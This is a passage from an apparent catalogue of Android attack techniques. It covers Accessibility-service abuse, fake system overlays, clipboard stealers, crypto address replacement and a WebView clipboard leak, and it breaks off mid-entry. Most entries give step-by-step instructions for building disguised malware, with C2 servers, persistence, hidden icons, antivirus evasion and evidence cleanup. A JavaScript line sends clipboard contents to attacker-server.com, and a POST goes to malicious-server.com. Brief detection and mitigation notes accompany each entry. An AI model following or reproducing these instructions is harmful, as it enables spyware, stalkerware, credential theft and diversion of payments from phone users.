- **Attack Steps**: 1. Create a new Android app using Android Studio with a misleading name like “System Health Optimizer” or “Accessibility Assistant” to avoid suspicion. 2. In AndroidManifest.xml, declare android.permission.BIND_ACCESSIBILITY_SERVICE, INTERNET, and optionally SYSTEM_ALERT_WINDOW for overlay use. 3. Create a service class that extends AccessibilityService. In the Accessibility config XML, register event types: TYPE_WINDOW_STATE_CHANGED, TYPE_VIEW_CLICKED, TYPE_VIEW_TEXT_CHANGED, and optionally TYPE_WINDOWS_CHANGED. 4. In the onAccessibilityEvent() method, detect when restricted apps are launched (e.g., banking apps like com.phonepe.app, com.google.android.apps.nbu.paisa.user, com.paytm, etc.) by checking event.getPackageName(). 5. Monitor the root detection warning screens or popups using event.getClassName() and event.getText() to identify typical root alerts such as “This device appears to be rooted”, “Security Alert”, “App cannot run on rooted devices”, etc. 6. Once detected, programmatically dismiss these warning dialogs using AccessibilityNodeInfo.performAction(ACTION_CLICK) on buttons with text like “OK”, “Close App”, or “Cancel”. 7. To bypass or remove visibility restrictions (e.g., greyed-out buttons), traverse the UI hierarchy using getRootInActiveWindow() and find the restricted View. Use ACTION_CLICK to simulate taps or re-enable the setEnabled(true) property using reflection (if allowed). 8. You can optionally overlay a fake error message that tricks the app into thinking a security error is already handled (e.g., via a transparent full-screen overlay saying “Security check passed”) using WindowManager. 9. In apps that disable screen sharing or block Accessibility, repeatedly monitor the window state and simulate tap sequences or gestures using dispatchGesture() to interact with hidden elements. 10. For some banking apps that scan for root apps (e.g., Magisk Manager), your app can pre-close those using accessibility automation by monitoring recent apps and closing them with simulated swipe gestures. 11. Install this APK on a rooted emulator or device. Once installed, manually grant Accessibility Service permissions. When the protected app is launched, your app actively dismisses the root warning, simulates legitimate activity, and allows continued use. 12. You can test this with real apps like Paytm or Google Pay on a rooted device and observe how the warning screens are automatically bypassed and the app continues to work, despite restrictions.
- **Detection**: Unusual Accessibility events triggered on secure apps, UI interaction logs inconsistent with user behavior, detection of node manipulation, forensic review of Accessibility logs and overlays
- **Solution**: 1. Developers should use SafetyNet/Play Integrity API with server-side checks, not just local checks. 2. Use tamper detection to block apps if screen readers or Accessibility is active. 3. Implement multi-factor checks (root detection, emulator detection, debugger check, accessibility detection). 4. Alert users when accessibility tools are in use during app operation. 5. Apply FLAG_SECURE to sensitive activities to block overlays and screenshots. 6. Monitor apps granted Accessibility via MDM, EDR, or Play Protect.
- **Tags**: accessibility bypass, root detection bypass, android malware, ui manipulation, secure app bypass, banking app hack, screen reader abuse

## Remote Control via Accessibility (Full Phone Control)

- **Attack Type**: Abusing Accessibility Services → Full Remote Control
- **Target**: Android Smartphones
- **Vulnerability**: Excessive trust in Accessibility Services, lack of permission granularity, weak UI security isolation
- **MITRE**: T1219 (Remote Access Trojan via Accessibility), T1546.008 (Accessibility Feature Abuse), T1056.001 (Input Capture), T1071 (Application Layer Protocol)
- **Impact**: Full device compromise, message hijacking, unauthorized transactions, surveillance, theft of sensitive data, real-time remote control
- **Tools**: Android Studio, AccessibilityService API, Python Flask or Node.js for fake C2 server, Burp Suite or Wireshark (optional for monitoring), ADB or emulator (for testing), ngrok (for port forwarding), ApkTool (for malware analysis), MITMproxy
- **Scenario**: This attack involves complete remote control over a victim’s phone using Accessibility Services without needing root or special device admin rights. Once the victim unknowingly grants Accessibility permission to the malicious app, the attacker can control almost every part of the device: tap buttons, open apps, read and send messages, access browser history, approve app permissions, uninstall apps, or perform banking transactions — all remotely. The attacker sends commands from a remote Command & Control (C2) server, which are executed by the device’s malicious Accessibility Service as simulated gestures or UI interactions. This is commonly used in mobile Remote Access Trojans (mRATs), spyware, and banking malware.
- **Attack Steps**: 1. Create a deceptive Android app in Android Studio (e.g., “Phone Cleaner”, “Battery Optimizer”, “System Booster”) to trick users into installing it. 2. In AndroidManifest.xml, add android.permission.BIND_ACCESSIBILITY_SERVICE, android.permission.INTERNET, android.permission.RECEIVE_BOOT_COMPLETED, and android.permission.SYSTEM_ALERT_WINDOW. 3. Add an Accessibility Service class. In the service config XML, register event types such as TYPE_WINDOW_CONTENT_CHANGED, TYPE_VIEW_CLICKED, and TYPE_WINDOW_STATE_CHANGED. Use packageNames="*" to monitor all apps. 4. In onAccessibilityEvent(), implement logic to listen for UI changes, view updates, and text inputs across all apps. 5. Build a remote Command & Control (C2) server using Python Flask or Node.js. The server should expose API endpoints (e.g., /click, /type, /scroll, /open_app) that the mobile app polls periodically or receives via WebSocket. 6. On receiving a command, the app interprets it and performs corresponding actions using AccessibilityNodeInfo.performAction() or dispatchGesture() — e.g., simulate taps on buttons, enter text in input fields, scroll through pages, or launch an app. 7. Examples: to open WhatsApp, simulate tap on home → swipe to app drawer → tap WhatsApp icon. To send a message, simulate typing text in chat field and click “Send”. 8. You can simulate PIN input by programmatically identifying numeric keypad buttons and triggering ACTION_CLICK on them using the getText() or getViewIdResourceName() from AccessibilityNodeInfo. 9. To access sensitive screens (like banking apps), use UI monitoring to detect their launch and automate the sequence (e.g., input credentials, approve transactions). 10. Periodically log screen context and send back to the C2 using HTTP POST requests with information like current package name, screen title, or captured view content. 11. Deploy this on a test phone or emulator with Accessibility manually enabled. Use ngrok to expose the C2 server on the internet. Control the phone from a browser or terminal by sending commands to the C2. The device now behaves like a fully compromised terminal, executing every attacker input via Accessibility automation. 12. (Optional) Use MITMproxy or Wireshark to monitor C2 communication and verify real-time execution of remote commands.
- **Detection**: Check logs for high-frequency Accessibility use, abnormal interaction patterns (simulated clicks, gestures), apps with suspicious internet + Accessibility combo, endpoint monitoring for unusual traffic
- **Solution**: 1. Use Android 13+ which shows active Accessibility warnings and limits background access. 2. Never grant Accessibility permission to utility apps. 3. Enforce Accessibility permission audit in enterprise devices (via MDM). 4. Use behavior-based mobile antivirus or EDR tools that detect automated interactions. 5. Developers of sensitive apps should block accessibility on critical screens (e.g., login, payment) using FLAG_SECURE and setImportantForAccessibility(View.IMPORTANT_FOR_ACCESSIBILITY_NO).
- **Tags**: android remote control, mRAT, accessibility attack, phone hijack, full device control, mobile spyware, c2 trojan

## Overlay on System Dialogs (Fake Permission Prompts)

- **Attack Type**: Abusing Accessibility Services → Fake System UI Overlays
- **Target**: Android Smartphones
- **Vulnerability**: Over-trust in Accessibility and overlay APIs, lack of user visibility between real and fake dialogs, weak detection of full-screen overlays
- **MITRE**: T1204.001 (Malicious UI Interaction), T1546.008 (Accessibility Feature Abuse), T1056.001 (Input Capture), T1556.004 (Input Prompt Spoofing)
- **Impact**: Users unknowingly grant critical permissions, install malware, or share credentials; used for privilege escalation, credential theft, and session hijack
- **Tools**: Android Studio, AccessibilityService API, SYSTEM_ALERT_WINDOW permission, ADB or emulator for testing, Python Flask (for fake C2), ApkTool (optional), Burp Suite or MITMproxy (to analyze data exfiltration), Ngrok (for exposing C2 server)
- **Scenario**: In this attack, the attacker uses Accessibility Services and SYSTEM_ALERT_WINDOW permission to draw a fake system-like dialog (such as a permission request, login, or fingerprint prompt) on top of real system or app dialogs. This tricks the user into approving malicious actions or entering sensitive information. The overlay mimics the exact appearance of legitimate system dialogs, making it almost indistinguishable from real ones. The attacker captures this input or uses it to auto-grant dangerous permissions. It is often used in banking trojans and Android spyware to deceive users and escalate privileges.
- **Attack Steps**: 1. Open Android Studio and create a new app (e.g., “Permissions Manager” or “System Optimizer”) to look trustworthy. 2. In AndroidManifest.xml, request BIND_ACCESSIBILITY_SERVICE, INTERNET, SYSTEM_ALERT_WINDOW, and optionally RECEIVE_BOOT_COMPLETED. 3. Create a background AccessibilityService that listens for TYPE_WINDOW_STATE_CHANGED and TYPE_WINDOW_CONTENT_CHANGED events. This helps detect when the target system dialog (e.g., a real permission prompt or security pop-up) appears. 4. In onAccessibilityEvent(), monitor the current foreground activity using event.getPackageName() or event.getClassName() to detect when a system dialog is active — such as a permission screen (com.android.packageinstaller), security confirmation (com.google.android.permissioncontroller), or biometric prompt (BiometricPrompt). 5. As soon as the real dialog is detected, launch a fake full-screen Activity using WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY. This fake screen mimics the exact appearance (icons, text, layout) of the original dialog. Use FLAG_NOT_TOUCH_MODAL and FLAG_NOT_FOCUSABLE to make it feel native. 6. In the fake overlay, include fields or buttons like “Allow”, “Deny”, fingerprint icon, or permission text. When the user clicks “Allow”, intercept the tap and use Accessibility’s performAction(ACTION_CLICK) to forward that to the original dialog underneath (granting real permission), or use it to auto-install apps, approve settings, or read the text entered. 7. You can also use this overlay to fake a “Login” or “Fingerprint Confirmation” prompt and extract credentials or sensitive information like PINs or OTPs from the user. 8. Send the captured data to a C2 server using HTTP POST (e.g., with Retrofit or raw HttpURLConnection). If not capturing data, silently trigger sensitive actions after the fake prompt is dismissed. 9. Auto-start the malicious service on boot using RECEIVE_BOOT_COMPLETED, and continuously monitor system UI to launch overlays at the right moment. 10. Install and test the APK on a physical or virtual device. Manually grant Accessibility and SYSTEM_ALERT_WINDOW permissions. Then simulate launching a permission screen (e.g., try accessing contacts from any app), and observe how the fake overlay appears seamlessly, captures the tap, and tricks the system into granting permissions or sending user data. 11. Use Burp Suite, Wireshark, or your own C2 server logs to verify how captured information is sent or actions are executed after the fake dialog interaction.
- **Detection**: Monitor overlays on top of system dialogs using secure UI frameworks, detect apps using both SYSTEM_ALERT_WINDOW + Accessibility, validate touch event chain in secure apps, app behavior anomaly analysis
- **Solution**: 1. Android 12+ blocks overlays on secure screens (use newer versions). 2. Use FLAG_SECURE and Accessibility block policies in sensitive apps. 3. Regularly review apps with SYSTEM_ALERT_WINDOW and Accessibility privileges. 4. Block apps from third-party stores, enforce runtime permission review, use mobile EDR that flags fake UI usage. 5. Users should avoid granting Accessibility to unknown apps.
- **Tags**: android overlay attack, fake prompt, accessibility abuse, phishing ui, permission hijack, mobile malware, tap injection

## Clipboard Monitoring (Background Stealer)

- **Attack Type**: Clipboard Hijacking in Mobile → Background Clipboard Monitor
- **Target**: Android Smartphones (esp. Android 9 and below, but also newer if permissions granted)
- **Vulnerability**: Insecure global clipboard access, lack of user notification, unrestricted foreground service behavior
- **MITRE**: T1056.001 (Input Capture), T1556.004 (Clipboard Data Hijack), T1546.008 (Abuse of Mobile OS Features)
- **Impact**: Leakage of sensitive copied data, credential theft, UPI fraud, crypto fund redirection, identity impersonation, session hijack
- **Tools**: Android Studio, Java/Kotlin, Burp Suite or MITMproxy (for C2 monitoring), Ngrok (for public server endpoint), Regex tools (to filter content), Python Flask (for mock server), Emulator or test phone
- **Scenario**: This attack monitors the clipboard in the background and steals sensitive information copied by the user — such as passwords, OTPs, crypto wallet addresses, UPI IDs, banking info, URLs, or authentication codes. Clipboard access on Android is shared system-wide, and apps running in the foreground or background (especially before Android 10) can read its content. Even in modern versions, with a foreground service and user-granted permissions, clipboard reading can be abused. The attacker’s app silently reads the clipboard repeatedly, scans for useful patterns (like Bitcoin addresses or UPI), and sends the data to a remote server or replaces it with a fake address (e.g., to redirect payments).
- **Attack Steps**: 1. Open Android Studio and create a basic app (e.g., “QR Scanner” or “Clipboard Notes”) that seems harmless and utility-based. 2. In AndroidManifest.xml, request the following permissions: android.permission.FOREGROUND_SERVICE, android.permission.INTERNET, and android.permission.RECEIVE_BOOT_COMPLETED if persistence is needed. Note: Direct READ_CLIPBOARD permission is not required — the app uses ClipboardManager APIs. 3. Create a ForegroundService that runs a background thread using Handler or ScheduledExecutorService to repeatedly check clipboard content every few seconds. 4. Use ClipboardManager clipboard = (ClipboardManager) getSystemService(Context.CLIPBOARD_SERVICE); and poll clipboard.getPrimaryClip() to get the latest copied text. 5. Apply regex filtering to detect patterns like UPI IDs ([a-zA-Z0-9.\-_]{2,256}@[a-zA-Z]{2,64}), crypto addresses (e.g., Ethereum/Bitcoin regex), OTPs (\b\d{4,8}\b), URLs, or common keywords like “password”, “login”, “code”. 6. Once matching content is found, store it in SharedPreferences or instantly exfiltrate it to a remote server using HttpURLConnection, Retrofit, or Volley. Example: POST to http://malicious-server.com/clipboard-leak with device info + data. 7. To make the app stealthy, show a harmless foreground notification like “Monitoring clipboard for QR codes...” and hide the actual logic in background threads. 8. Optionally, if a cryptocurrency address is detected, replace the clipboard content with attacker’s wallet using clipboard.setPrimaryClip(ClipData.newPlainText("label", "attacker_wallet_address")), so that the user unknowingly sends funds to attacker. 9. Set the service to auto-start using RECEIVE_BOOT_COMPLETED to persist across reboots. 10. Install the APK on a test phone/emulator. Copy a test OTP, UPI ID, or wallet address and monitor server logs (via Burp or Flask console) to confirm that clipboard data is captured and sent in real time.
- **Detection**: Monitor network activity from unknown apps during clipboard usage, track clipboard access via behavior analysis tools, Android 12+ shows clipboard access indicators, mobile EDR tools
- **Solution**: 1. Upgrade to Android 12+ which limits clipboard access and alerts user when clipboard is accessed. 2. Avoid granting background service or overlay permissions to suspicious apps. 3. Use a password manager with auto-fill instead of copy-pasting credentials. 4. Use mobile security tools that monitor clipboard abuse. 5. Developers: Avoid exposing sensitive data to the clipboard.
- **Tags**: clipboard hijack, background stealer, android clipboard monitor, upi leak, crypto address swap, password theft, otp stealer

## Crypto Address Replacement (Clipboard Injector)

- **Attack Type**: Clipboard Hijacking → Crypto Address Injection
- **Target**: Mobile Users (Android Phones)
- **Vulnerability**: Android Clipboard Service Exposure, Lack of User Validation on Pasted Data
- **MITRE**: T1056.001 (Input Capture – Keylogging/Clipboard Monitoring)
- **Impact**: Financial Loss, Untraceable Crypto Theft, Silent Data Manipulation
- **Tools**: Android Studio, APKTool, Frida, Termux, ADB, Android Emulator or Physical Android Device, Victim Wallet App (e.g., Trust Wallet), Attacker Wallet
- **Scenario**: In this attack scenario, a malicious Android app secretly monitors the clipboard in the background. When a user copies a cryptocurrency wallet address (e.g., during a transaction), the app automatically replaces it with the attacker’s wallet address. The user, unaware of the switch, pastes the attacker's address into a crypto wallet app or exchange site and unknowingly transfers funds to the attacker's wallet. This method is extremely dangerous and hard to detect without manually verifying pasted content. It is a silent attack, common in mobile clipboard hijackers.
- **Attack Steps**: Step 1: Set up the Attacker Wallet – Create a cryptocurrency wallet (e.g., using MetaMask, Trust Wallet, or any anonymous wallet) where stolen funds will be sent. Save the wallet address carefully. Step 2: Build or Modify a Malicious Android App – Use Android Studio or APKTool to either build a simple fake app (e.g., flashlight, cleaner) or modify a legit APK by injecting clipboard-monitoring code in the background using a BroadcastReceiver or Service. Step 3: Inject Clipboard Monitoring Code – In your app’s MainActivity.java or as a background Service, add code to listen to the system clipboard. Use the ClipboardManager class in Android to monitor clipboard content. Check if copied text matches the format of cryptocurrency addresses (e.g., starts with "0x" for Ethereum or contains 26–35 alphanumeric characters for Bitcoin). When such content is detected, use ClipboardManager.setPrimaryClip() to instantly replace the copied address with the attacker’s wallet address. Step 4: Install the Malicious APK on Target Device – Use ADB (adb install appname.apk) or social engineering (e.g., phishing, fake app link) to trick the victim into installing the app. Enable permission to run in background if required (for modern Android versions). Make sure the app requests FOREGROUND_SERVICE or BIND_ACCESSIBILITY_SERVICE for persistent execution. Step 5: Trigger the Attack – Wait for the user to open a crypto app or copy a wallet address. The app will silently replace the copied address. When the user pastes it during a transaction (e.g., on Binance or Trust Wallet), the attacker’s address is used instead. Step 6: Receive the Funds – Once the victim unknowingly initiates the transfer to the attacker’s wallet, you can track the transaction via blockchain explorer (e.g., Etherscan for Ethereum, Blockchain.info for BTC). Optional Step 7: Obfuscate the Code – Use tools like ProGuard or APK obfuscators to hide the clipboard hijacking logic in the code to avoid detection by antivirus software. Step 8: Clean Up Evidence (Advanced) – Modify app name, hide app icon, remove logs if rooted, and clear install trails to reduce suspicion.
- **Detection**: Monitor clipboard access logs, install behavior tracking tools (e.g., AppAudit, PrivacyBreacher), manually verify copied and pasted wallet addresses before confirming transactions
- **Solution**: Use clipboard monitoring protection apps, verify clipboard content before pasting, avoid installing apps from unknown sources, disable clipboard access in background apps (via App Settings), update Android regularly
- **Tags**: #ClipboardHijacking #CryptoSecurity #MobileMalware #CryptoTheft #AndroidExploit

## Clipboard Logging Over Time (Spyware Logger)

- **Attack Type**: Clipboard Hijacking → Persistent Clipboard Logger
- **Target**: Android Phones (Mobile Users)
- **Vulnerability**: Android ClipboardManager API is globally accessible by background apps without notification to the user

- **Impact**: Identity Theft, Credential Harvesting, OTP Interception, Privacy Violation, Surveillance
- **Tools**: Android Studio, Java/Kotlin, ADB, Termux, Frida (for analysis), Firebase or custom API server (for data exfiltration), Emulator or Android Phone
- **Scenario**: In this attack, a malicious Android app is secretly installed on a user’s mobile phone and continuously monitors the clipboard in the background. Unlike crypto address replacement which targets one-time events, this spyware logs every clipboard content (passwords, emails, OTPs, banking info) over time and sends it to an attacker’s server or stores it locally. It’s a stealthy data exfiltration method used by mobile spyware and commercial stalkerware tools. Users remain unaware because the app runs in the background, has no visible UI, and requests no suspicious permissions except basic background access.
- **Attack Steps**: Step 1: Set up Logging Infrastructure – Create a backend (can be Firebase Realtime DB, Google Sheets via script, or a custom Python Flask server) that will receive and store clipboard data. The backend should accept POST requests containing timestamp and clipboard contents from the infected device. Test the server endpoint using Postman or Termux curl. Step 2: Build a Malicious Android App (Spyware) – Open Android Studio and create a simple app with no visible UI (can be disguised as a calculator, cleaner, wallpaper app). In MainActivity.java or a background Service, use the ClipboardManager API to access clipboard content continuously. Step 3: Create Persistent Clipboard Logger – Register a ClipboardManager.OnPrimaryClipChangedListener to trigger every time the clipboard changes. Inside the listener, fetch the clipboard content and send it to the attacker's server along with the device ID and timestamp using HttpURLConnection or Retrofit. The logic runs continuously in a ForegroundService or as a JobIntentService to survive system restarts. Use AlarmManager or WorkManager to keep the logging active even after reboot or force stop. Step 4: Deploy the App on Target Mobile Device – Use USB debugging with adb install to sideload the APK on the target Android device or send it via email/drive/social engineering and trick the user into installing. Make sure the app does not request suspicious permissions to avoid detection. Request only basic permissions like Internet and ForegroundService. Step 5: Hide the App from App Drawer – Modify the manifest to disable the launcher icon. You can do this by not defining a launcher activity or setting the icon visibility to "false." This makes the app invisible to normal users. Step 6: Start Background Clipboard Logging – Once installed, the app runs silently in the background. Each time the user copies something to the clipboard (e.g., password, OTP, wallet address, message), the listener gets triggered, and the copied content is sent to the attacker’s server. This creates a full timeline of the victim's sensitive data. Step 7: Monitor Logs in Real Time – On the attacker's end, monitor all incoming clipboard data sorted by timestamp and device ID. Analyze for keywords like "OTP", "login", "password", or crypto strings. You can use a simple Flask dashboard or Google Sheet to track all entries in real-time. Step 8: Optional – Add Code Obfuscation – Use tools like ProGuard or DexGuard to encrypt and hide logging logic. This helps bypass mobile antivirus detection. Optionally sign the APK with a custom keystore to avoid Google Play warnings. Step 9: Long-Term Stealth Operation – The spyware runs indefinitely in background unless detected by the user. Logs can be used to harvest credentials, hijack sessions, bypass 2FA, and track user behavior without their consent.
- **Detection**: Monitor clipboard access logs using tools like AppAudit, Activity Watcher, or Frida scripts. Unusual background data usage by unknown apps can also indicate spyware. Battery and memory consumption spikes can be a clue.
- **Solution**: Educate users to only install apps from official stores, use clipboard protection apps like Clipper or Access Dots, run regular antivirus scans, check background data permissions, and reboot device to disable persistent services. Android 10+ users should enable clipboard privacy under settings.
- **Tags**: #Spyware #ClipboardHijacking #MobileSurveillance #Stalkerware #ClipboardLogger #AndroidExploit

## Accessibility-Based Clipboard Monitoring

- **Target**: Android Mobile Devices (especially Android 10 and above)
- **Vulnerability**: Abuse of Accessibility Services, UI Content Exposure, Clipboard Monitoring via Screen Parsing
- **MITRE**: T1056.001 (Input Capture – Accessibility Abuse for Clipboard Reading)
- **Impact**: Full privacy compromise, Stealth data exfiltration, Theft of passwords, crypto addresses, private chats, OTPs, 2FA codes, identity data

- **Scenario**: In this attack, the malicious app abuses Android’s Accessibility Services to monitor and extract clipboard contents without using the standard ClipboardManager API. Accessibility Services are meant for helping users with disabilities (e.g., screen readers), but when misused, they give attackers near-complete control over screen content, UI interactions, and clipboard data. Unlike normal clipboard hijackers, this method bypasses restrictions imposed on newer Android versions (Android 10+), which limit direct clipboard access. By impersonating an accessibility tool, spyware can detect clipboard changes by observing UI events and reading the copied text directly from screen nodes, even when traditional clipboard access is blocked.
- **Attack Steps**: Step 1: Create a Firebase or Custom Logging Server – Set up a backend server or Firebase Realtime Database that will receive and store logged clipboard data. This is where the exfiltrated text will be sent from the victim device. Test it using simple POST requests or curl. Step 2: Develop a Malicious Android App with Accessibility Service – In Android Studio, build an app that pretends to serve a legitimate function (like a cleaner, booster, etc.) and declare a custom Accessibility Service in the manifest (<service android:name=".MyAccessibilityService" with android.permission.BIND_ACCESSIBILITY_SERVICE). Add metadata in accessibilityservice.xml with proper configuration (event types, feedback type, etc.). Step 3: Request Accessibility Permission at Runtime – On first run, the app should request the user to enable accessibility service for it by directing them to Settings.ACTION_ACCESSIBILITY_SETTINGS. Use social engineering (e.g., fake instruction screens like “Enable Booster for better performance”) to convince the user. Once enabled, this service runs with elevated privileges. Step 4: Monitor Clipboard-Related Events – Inside MyAccessibilityService, override onAccessibilityEvent(). Watch for event types like TYPE_VIEW_TEXT_CHANGED, TYPE_VIEW_FOCUSED, and TYPE_WINDOW_CONTENT_CHANGED. These help track when user interacts with text fields. Step 5: Extract Text Nodes via AccessibilityNodeInfo – Use the service to fetch screen content using getRootInActiveWindow() and traverse AccessibilityNodeInfo tree. For each node, check if it's an EditText or copyable field, and if its content has changed. This allows you to read the copied text directly from the UI even if the user didn’t explicitly paste it yet. This bypasses the clipboard permission restrictions. Step 6: Log and Exfiltrate Clipboard Data – Each time a copied string is detected (email, OTP, crypto address, message), send the data along with timestamp and app context (like the package name of the source app) to your backend server using Retrofit or HTTP client. Optionally, save logs locally first and sync later when online. Step 7: Run Service in Background Stealthily – Ensure the Accessibility Service is declared with android:exported=false for stealth and use a persistent foreground service to avoid system kill. Hide app icon from launcher using intent filters. The spyware runs indefinitely without user awareness. Step 8: Optional – Add Filters and Obfuscation – Add filters to log only relevant keywords (OTP, password, key, wallet) and use ProGuard or DexGuard to obfuscate your code and make it harder to detect during static analysis. Step 9: Monitor and Analyze Logs – On the attacker’s side, monitor the backend logs in real-time. Analyze text data to capture credentials, tokens, transaction details, or personal messages copied by the user. This data can be exploited or sold on black markets. Step 10: Clean Up Traces (Advanced) – If building persistent spyware, use a silent update mechanism or dropper loader to reload the service even after uninstall attempts. Hide logs, remove from recent apps, and disable app crash logs.
- **Detection**: Use Android Accessibility Service Monitor apps, review battery and background process usage, analyze Logcat logs for suspicious services, use Frida scripts to detect misuse of AccessibilityNodeInfo or services registering too many events
- **Solution**: Educate users never to allow unknown apps access to Accessibility Services, regularly check Accessibility settings for unknown services, use Android security apps that monitor abuse, limit background activity of unused apps, enable Play Protect, and run monthly full-device scans. From Android 12+, clipboard auto-clearing reduces risk.
- **Tags**: #AccessibilityHijack #MobileSpyware #AndroidAbuse #ClipboardMonitoring #AccessibilityExploit #MobileSecurity

## Floating Clipboard Overlay (Visual Hijack)

- **Attack Type**: Clipboard Hijacking → Floating Overlay Exploit
- **Target**: Android Phones (Especially Android versions < 12)
- **Vulnerability**: SYSTEM_ALERT_WINDOW misuse, Clipboard API misuse, UI Deception, Lack of overlay detection in userspace
- **MITRE**: T1201 (Input Capture via GUI Overlay), T1056.001 (Clipboard Monitoring), T1141 (Input Prompt Spoofing)
- **Impact**: User tricked into copying, pasting or trusting fake clipboard content, Financial theft, Fake login/phishing, Crypto theft, OTP hijack, Identity leakage
- **Tools**: Android Studio, Java/Kotlin, Android Emulator or rooted phone, APKTool, Termux, ADB, AutoInput App (for automation), Firebase or HTTP Server (optional), Android Overlay Permission (SYSTEM_ALERT_WINDOW)
- **Scenario**: In this attack, a malicious Android app creates a floating window (overlay) that mimics a helpful clipboard or “clipboard history” tool. When a user copies sensitive text (e.g., OTP, password, crypto address), this fake overlay appears as a system-style popup and silently shows altered or fake data. The goal is to mislead the user into trusting the overlay content, and copying/pasting or acting on that manipulated visual info, while the real clipboard is hijacked or misused silently in the background. This attack is especially dangerous because overlays bypass app sandboxing and are commonly used by phishing malware to create fake input fields, dialogs, or clipboard UIs.
- **Attack Steps**: Step 1: Build a Fake Utility App Offering Clipboard Features – Create a seemingly useful Android app (e.g., “Clipboard Manager”, “Smart Copy Tool”, or “Floating Translator”) using Android Studio. The app will claim to improve the user’s clipboard or display helpful overlays. In the manifest, request SYSTEM_ALERT_WINDOW permission, which allows the app to draw over other apps. This is essential for creating overlays that appear on top of other apps like WhatsApp, banking apps, or Google Chrome. Step 2: Design a Floating Overlay UI – Create a floating layout (e.g., WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY) that mimics Android system dialogs or clipboard notifications. Make it look authentic by copying styles, colors, and fonts from native Android clipboard previews. Add fake information to this overlay, such as a misleading copied text or slightly altered wallet address. You can even use animation to simulate "copy complete" feedback. Step 3: Monitor Clipboard Changes in the Background – In your app’s background service, use Android’s ClipboardManager.OnPrimaryClipChangedListener to detect when a user copies text to the clipboard. When a change is detected, extract the copied data using getPrimaryClip() and analyze if it matches specific patterns (e.g., if it looks like a password, OTP, crypto address, or credit card). Step 4: Trigger the Overlay with Fake Info – Immediately after detecting clipboard data, launch your overlay window using the WindowManager service. Display the fake or manipulated clipboard content in the floating window. For example, if the copied address is 0xABC123, display 0xA8C123 in the overlay. Most users will glance at the overlay and assume it’s their valid data. Step 5: Allow Overlay Interaction (Optional) – Make the overlay interactive. Add a “Copy Again” button, which actually sets the clipboard to the attacker’s address or a phishing link. You can also create an input field (EditText) over login forms that captures and stores what the user types, then relays it to your server. This turns the overlay into a phishing interface. Step 6: Stealth Execution – Ensure your overlay window is set with flags like FLAG_NOT_FOCUSABLE and FLAG_LAYOUT_IN_SCREEN so it doesn’t trigger user suspicion. The app should also use a background service with low memory footprint to avoid Android killing it. Hide the app icon or rename the app to look like a system component. Step 7: Hijack Actual Clipboard in Background – While the user is tricked by the overlay, in the background your app can either replace the clipboard content using setPrimaryClip() or log and exfiltrate the real clipboard content to your remote server or Firebase. Now, the user trusts the fake overlay, while the real clipboard is compromised. Step 8: Deploy on Target Device – Sideload the malicious APK using adb install or via social engineering (e.g., offering clipboard utility on a shady website or a fake app store). Ask user to manually grant “Draw over apps” permission. Many users grant this for apps like screen recorders or chat heads. Step 9: Analyze and Store Logs (Optional) – You can add code to log all copied content and send it to your Firebase backend with timestamps, app context (like package name), and overlay status. This builds a timeline of user behavior. Step 10: Maintain Persistence and Update Overlay Triggers – Add BootReceiver to relaunch overlay service at startup. Optionally, enhance by detecting specific apps (e.g., Wallet, Banking, Messaging) using UsageStatsManager or Accessibility Events to show overlays only when users are in sensitive apps. This makes the attack more targeted and stealthy.
- **Detection**: Use Play Protect or security apps that detect apps with overlay permission and clipboard access. Observe strange overlay windows or unexpected popups. Monitor accessibility or usage stat access for clipboard-type apps. Use Logcat to trace overlay service calls.
- **Solution**: Avoid granting “Draw over other apps” permission unless absolutely trusted. Check which apps have SYSTEM_ALERT_WINDOW via Settings > Special App Access. Use clipboard managers from trusted developers. On Android 12+, clipboard auto-clears after short time to reduce exposure.
- **Tags**: #ClipboardOverlay #VisualHijack #MobileSecurity #OverlayPhishing #AndroidExploit #ClipboardHack

## Malicious WebView Clipboard Leak

- **Attack Type**: Clipboard Hijacking → WebView-Based Data Theft
- **Target**: Android Mobile Users (Android 9 and lower especially)
- **Vulnerability**: Abuse of WebView + JavaScript Clipboard API without permissions or user visibility
- **MITRE**: T1056.001 (Input Capture – Clipboard Monitoring), T1189 (Drive-by Compromise via WebView), T1185 (Browser Content Manipulation)
- **Impact**: Silent extraction of copied sensitive data, OTP leakage, crypto address theft, credential theft, user behavior profiling, stealth spyware injection
- **Tools**: Android Studio, Java/Kotlin, ADB, Termux, APKTool, Android Emulator or device, Frida (optional), Web Server (e.g., Flask/Node.js), JavaScript Payload
- **Scenario**: In this attack, a malicious mobile app embeds a WebView component that silently executes JavaScript to read clipboard content from the user’s device whenever a user opens the app. The app looks legitimate (e.g., a news app or quiz app), but under the hood, it opens a web page inside a WebView and uses injected JavaScript to access the clipboard without user consent. Some older Android WebView versions and custom keyboards allow JavaScript or focused input fields to automatically capture clipboard content without needing special permissions. This attack is highly stealthy and effective for extracting sensitive copied content such as OTPs, passwords, crypto addresses, and personal messages.
- **Attack Steps**: Step 1: Build a Malicious Android App with WebView – In Android Studio, create a new Android app (e.g., “Fast News”, “Fun Quiz App”, “Currency Converter”) that uses a WebView component to load web content. In your layout file (activity_main.xml), include a <WebView> element. In your MainActivity.java, configure the WebView with webView.getSettings().setJavaScriptEnabled(true); and load a remote or local HTML file using webView.loadUrl("file:///android_asset/clipboardsteal.html"); or a hosted server URL. Step 2: Create JavaScript to Access Clipboard – Write a small HTML+JavaScript file (e.g., clipboardsteal.html) that includes an input field and auto-focus behavior. The JavaScript code should auto-focus a hidden input field and attempt to read the clipboard content using navigator.clipboard.readText() (on supported Android versions with focus). Example: <script>setInterval(() => { navigator.clipboard.readText().then(text => fetch('https://attacker-server.com/leak', { method: 'POST', body: text }) ) }, 3000);</script>. This polls the clipboard every few seconds and leaks the data. Step 3: Serve the HTML File Locally or Host on Web Server – You can embed the HTML file in assets/ folder of your APK, or upload it to your remote server. The WebView will load and execute it when the app starts. Step 4: Add Clipboard Auto-Focus Trigger – Make sure your HTML sets focus on a hidden or visible input tag (<input autofocus>) so that clipboard access permissions (on some Android versions) are granted automatically. Some keyboard apps and browser engines allow this without user interaction. Step 5: Add JavaScript Interface (Optional) – To exfiltrate clipboard data back to Java layer, add a @JavascriptInterface bridge in MainActivity.java. You can write a Java function to capture text and send it to a remote server or log it locally. Step 6: Deploy the APK on Target Device – Sideload the APK using adb install or distribute it using social engineering (e.g., fake download site). Once opened, the app silently loads the WebView and executes the JavaScript that reads and leaks clipboard content. No special Android permissions are needed, and the victim doesn’t see any warning. Step 7: View Stolen Clipboard Data on Server – On your server (Flask or Node.js backend), log the POST requests containing the leaked 